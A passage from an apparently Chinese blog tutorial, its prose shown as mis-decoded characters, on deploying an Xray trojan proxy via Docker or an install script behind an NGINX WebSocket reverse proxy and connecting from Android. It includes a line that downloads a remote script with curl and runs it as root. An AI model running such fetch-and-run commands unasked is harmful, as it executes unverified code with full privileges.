è¿›è¡Œéƒ¨ç½²ï¼ˆæ¨èï¼‰</h3><p>å®‰å…¨èµ·è§ï¼Œç¬”è€…æ¨èä½¿ç”¨ Docker éƒ¨ç½²ï¼Œè¿™åŒæ—¶ä¹Ÿæ¶ˆé™¤äº†å‘è¡Œç‰ˆä¹‹é—´çš„å·®å¼‚æ€§å¯èƒ½å¯¼è‡´çš„éƒ¨ç½²å¤±è´¥ï¼ˆä¾‹å¦‚è¯´ä½ å¯èƒ½å–œæ¬¢åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šä½¿ç”¨å¥‡å¥‡æ€ªæ€ªçš„å‘è¡Œç‰ˆï¼‰</p><p>é¦–å…ˆç¼–å†™é…ç½®æ–‡ä»¶ <code>config.json</code> ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;log&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;loglevel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;warning&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;å®¹å™¨å†…çš„æ—¥å¿—åœ°å€ï¼Œä¾‹å¦‚/var/log/xray/error.log&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;access&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;å®¹å™¨å†…çš„æ—¥å¿—åœ°å€ï¼Œä¾‹å¦‚/var/log/xray/access.log&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;inbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> ä½ çš„è‡ªå®šä¹‰çš„xrayæœ¬åœ°ç›‘å¬ç«¯å£ï¼Œä¾‹å¦‚<span class="hljs-number">11451</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;trojan&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;clients&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ä½ è‡ªå·±æƒ³ä¸€ä¸ªå¯†ç &quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;streamSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ws&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;wsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/è‡ªå·±è®¾å®šçš„è·¯å¾„&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sniffing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;destOverride&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;tls&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;routing&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;rules&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;bittorrent&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blocked&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;outbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;freedom&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blocked&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blackhole&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>ç„¶åå†™ Dockerfileï¼š</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> debian:latest<br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get upgrade -y</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y curl wget unzip procps</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> wget -P /root/ https://github.com/XTLS/Xray-core/releases/download/v24.11.5/Xray-linux-64.zip</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> unzip /root/Xray-linux-64.zip -d /root/</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/xray</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./config.json /root/config.json</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\n/root/xray run -config /root/config.json\nsleep infinity&quot;</span> &gt; /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> -p /var/log/xray</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">ln</span> -sf ../usr/share/zoneinfo/Australia/Melbourne /etc/localtime</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/start.sh&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸¤ä¸ªæ–‡ä»¶æ”¾åŒä¸€ä¸ªç›®å½•ä¸‹ï¼Œè¿è¡Œå¦‚ä¸‹å‘½ä»¤åˆ›å»ºé•œåƒå¹¶å¯åŠ¨å®¹å™¨å³å¯ï¼Œæ–¹ä¾¿èµ·è§è¿™é‡Œç›´æ¥ä½¿ç”¨æ•´ä¸ªæœåŠ¡å™¨ç½‘ç»œï¼Œä½ ä¹Ÿå¯ä»¥é€‰æ‹©è‡ªè¡Œé…ç½®ç«¯å£è½¬å‘ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t a3xray .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --name=a3xray --network=host a3xray</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤é…ç½®å®¹å™¨è‡ªå¯åŠ¨ï¼ˆæ¯•ç«Ÿæœ‰çš„æ—¶å€™ç³»ç»Ÿæ›´æ–°æˆ–è®¸ä¼šéœ€è¦ä½ é‡å¯ï¼Œ<del>å½“ç„¶ä½ ä¹Ÿå¯ä»¥é€‰æ‹©ç›´æ¥ä¹° RedHat æˆ–æ˜¯ SUSE çš„ kernel live patch æœåŠ¡ä»¥é¿å…è¿™ä¸ªéœ€è¦</del> ï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker update --restart=always a3xray</span><br></code></pre></td></tr></table></figure><h3 id="æ–¹æ³•2ï¸âƒ£ï¼šä½¿ç”¨å®˜æ–¹å®‰è£…è„šæœ¬"><a href="#æ–¹æ³•2ï¸âƒ£ï¼šä½¿ç”¨å®˜æ–¹å®‰è£…è„šæœ¬" class="headerlink" title="æ–¹æ³•2ï¸âƒ£ï¼šä½¿ç”¨å®˜æ–¹å®‰è£…è„šæœ¬"></a>æ–¹æ³•2ï¸âƒ£ï¼šä½¿ç”¨å®˜æ–¹å®‰è£…è„šæœ¬</h3><p>ä½ ä¹Ÿå¯ä»¥é€‰æ‹©ä½¿ç”¨å®˜æ–¹æ‰€ç»™çš„å®‰è£…è„šæœ¬è¿›è¡Œå®‰è£…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo bash -c <span class="hljs-string">&quot;<span class="hljs-subst">$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)</span>&quot;</span> @ install</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥éšä¾¿ç”Ÿæˆä¸€ä¸ª uuid ä½œä¸ºå¯†ç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">xray uuid</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ç¼–è¾‘é…ç½®æ–‡ä»¶ <code>/usr/local/etc/xray/config.json</code> ï¼Œå†™å…¥å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;log&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;loglevel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;warning&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ä½ çš„æ—¥å¿—åœ°å€ï¼Œä¾‹å¦‚/var/log/xray/error.logï¼Œåˆ«å¿˜äº†ç»™æƒé™&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;access&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ä½ çš„æ—¥å¿—åœ°å€ï¼Œä¾‹å¦‚/var/log/xray/access.logï¼Œåˆ«å¿˜äº†ç»™æƒé™&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;inbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> ä½ çš„è‡ªå®šä¹‰çš„xrayæœ¬åœ°ç›‘å¬ç«¯å£ï¼Œä¾‹å¦‚<span class="hljs-number">11451</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;trojan&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;clients&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ä½ è‡ªå·±æƒ³ä¸€ä¸ªå¯†ç &quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;streamSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ws&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;wsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/è‡ªå·±è®¾å®šçš„è·¯å¾„&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sniffing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;destOverride&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;tls&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;routing&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;rules&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;bittorrent&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blocked&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;outbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;freedom&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blocked&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blackhole&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œæµ‹è¯•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">xray -<span class="hljs-built_in">test</span> -config /usr/local/etc/xray/config.json</span><br></code></pre></td></tr></table></figure><p>æ˜¾ç¤ºå¦‚ä¸‹ç»“æœè¯´æ˜é…ç½®æ–‡ä»¶æ­£å¸¸ï¼š</p><p><img src="https://s2.loli.net/2024/09/12/EYHDBwvkuoXnOtN.png"></p><p>ç„¶åé‡å¯ xrayï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart xray</span><br></code></pre></td></tr></table></figure><h2 id="é…ç½®-NGINX-è½¬å‘-Xray"><a href="#é…ç½®-NGINX-è½¬å‘-Xray" class="headerlink" title="é…ç½® NGINX è½¬å‘ Xray"></a>é…ç½® NGINX è½¬å‘ Xray</h2><p>ç›®å‰æœ‰ä¸¤ç§ä¸»æµæ–¹æ¡ˆï¼šXray å‰ç½®ä¸ NGINX å‰ç½®ï¼Œå‰ç½®æ„å‘³ç€è¯¥èŠ‚ç‚¹è´Ÿè´£æ¥æ”¶æ‰€æœ‰æµé‡ï¼Œå¹¶åˆ†æµåˆ°ç›¸åº”çš„æœåŠ¡ä¸Šï¼ŒXray å‰ç½®åˆ™æ„å‘³ç€ç”± Xray æ£€æµ‹åè®®ï¼Œå¹¶å°†é <code>VLESS/Trojan/...</code> åè®®â€œå›è½â€åˆ° NGINXï¼ŒNGINX å‰ç½®åˆ™åè¿‡æ¥</p><p>Xray å›è½ NGINX æ®è¯´å·²ç»æœ‰èƒ½å¤Ÿæ£€æµ‹çš„æ‰‹æ®µï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬é…ç½® NGINX åä»£ WebSocket æµé‡è½¬å‘åˆ°åç«¯çš„ä»£ç†æœåŠ¡å™¨</p><p>å°† NGINX é…ç½®æ–‡ä»¶ä¸­çš„ 443 ç«¯å£ç›‘å¬ä¿®æ”¹å¦‚ä¸‹ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">server_name</span> ä½ çš„åŸŸå;<br><br>        <span class="hljs-attribute">ssl_protocols</span>   TLSv1.<span class="hljs-number">2</span> TLSv1.<span class="hljs-number">3</span>;<br>        <span class="hljs-attribute">ssl_certificate</span>     ä½ çš„ .pem è¯ä¹¦è·¯å¾„;<br>        <span class="hljs-attribute">ssl_certificate_key</span> ä½ çš„ .key å¯†é’¥è·¯å¾„;<br>        <span class="hljs-attribute">ssl_session_cache</span>       shared:SSL:<span class="hljs-number">10m</span>;<br>        <span class="hljs-attribute">ssl_session_timeout</span>     <span class="hljs-number">10m</span>;<br><br>        <span class="hljs-section">location</span> / &#123;<br>                <span class="hljs-attribute">root</span> /srv/www/hexo-blog;<br>                <span class="hljs-attribute">index</span> index.html;<br>        &#125;<br><br>        <span class="hljs-section">location</span> /å’Œxrayé…ç½®ç›¸åŒçš„ä½ çš„è‡ªå®šä¹‰è·¯å¾„ &#123;<br>                <span class="hljs-attribute">if</span> (<span class="hljs-variable">$http_upgrade</span> != <span class="hljs-string">&quot;websocket&quot;</span>) &#123;<br>                        <span class="hljs-attribute">return</span> <span class="hljs-number">400</span>;<br>                &#125;<br>                <span class="hljs-attribute">proxy_pass</span> http://127.0.0.1:å’Œxrayé…ç½®ç›¸åŒçš„ä½ çš„è‡ªå®šä¹‰æœ¬åœ°ç›‘å¬ç«¯å£ï¼Œä¾‹å¦‚11451;<br>                <span class="hljs-attribute">proxy_intercept_errors</span> <span class="hljs-literal">on</span>;<br>                <span class="hljs-attribute">error_page</span> <span class="hljs-number">400</span> = https://ä½ è‡ªå·±çš„åŸŸå/;<br><br>                <span class="hljs-attribute">proxy_http_version</span> <span class="hljs-number">1</span>.<span class="hljs-number">1</span>;<br>                <span class="hljs-attribute">proxy_set_header</span> Upgrade <span class="hljs-variable">$http_upgrade</span>;<br>                <span class="hljs-attribute">proxy_set_header</span> Connection <span class="hljs-string">&quot;upgrade&quot;</span>;<br>                <span class="hljs-attribute">proxy_read_timeout</span> <span class="hljs-number">600s</span>;<br><br>                <span class="hljs-attribute">proxy_set_header</span> X-Read-IP <span class="hljs-variable">$remote_addr</span>;<br>                <span class="hljs-attribute">proxy_set_header</span> X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åæŒ‰æƒ¯ä¾‹é‡å¯ NGINXï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart nginx.service</span><br></code></pre></td></tr></table></figure><p>è‡³æ­¤ï¼ŒæœåŠ¡ç«¯ä¾§çš„é…ç½®å…¨éƒ¨å®Œæˆ</p><h1 id="0x03-è¿æ¥ä»£ç†æœåŠ¡å™¨"><a href="#0x03-è¿æ¥ä»£ç†æœåŠ¡å™¨" class="headerlink" title="0x03. è¿æ¥ä»£ç†æœåŠ¡å™¨"></a>0x03. è¿æ¥ä»£ç†æœåŠ¡å™¨</h1><h2 id="åœ¨-Android-æ‰‹æœºä¸Šè¿›è¡Œè¿æ¥"><a href="#åœ¨-Android-æ‰‹æœºä¸Šè¿›è¡Œè¿æ¥" class="headerlink" title="åœ¨ Android æ‰‹æœºä¸Šè¿›è¡Œè¿æ¥"></a>åœ¨ Android æ‰‹æœºä¸Šè¿›è¡Œè¿æ¥</h2><p>æ—¢ç„¶æœ€åˆçš„ç›®çš„æ˜¯ç©åŸç¥ï¼Œé‚£ä¹ˆé¦–å…ˆè‚¯å®šè¦å…ˆçœ‹çœ‹åœ¨æ‰‹æœºä¸Šå¦‚ä½•é…ç½®</p><p>å¯¹äº Android ç³»ç»Ÿï¼Œå¯ä»¥åœ¨ Google Play å•†åº—ä¸‹è½½ v2rayNGï¼Œæ‰‹åŠ¨è¾“å…¥ trojan ç›¸å…³é…ç½®å³å¯ï¼Œæ³¨æ„åœ°å€å’Œ host ä»…å†™åŸŸåï¼Œä¸è¦æŠŠ <code>https://</code> å’Œå­è·¯å¾„ä¹Ÿç»™å†™è¿›å»äº†ï¼š</p><p><img src="https://s2.loli.net/2024/09/19/5KhrJYWVHeQqPmc.jpg"></p><p>æµ‹è¯•ï¼ŒæˆåŠŸè¿ç§»åˆ°ç¬”è€…åœ¨ Vultr è´­ä¹°çš„ä½äº Singapore çš„æœåŠ¡å™¨ï¼š</p><p><img src="https://s2.loli.net/2024/09/19/SvTfzqpi2e5RsjK.jpg"></p><h2 id="åœ¨-Windows-ä¸Šè¿›è¡Œè¿æ¥"><a href="#åœ¨-Windows-ä¸Šè¿›è¡Œè¿æ¥" class="headerlink" title="åœ¨ Windows ä¸Šè¿›è¡Œè¿æ¥"></a>åœ¨ Windows ä¸Šè¿›è¡Œè¿æ¥</h2><p>å¤§éƒ¨åˆ†äººç‰©ç†æœºç”¨çš„åº”è¯¥è¿˜æ˜¯ Windowsï¼Œä½†æ˜¯ç¬”è€…ä¸ç”¨ Windowsï¼Œæ‰€ä»¥è¿™é‡Œç¬”è€…ä»…ç»™ä¸€ä¸ª Windows 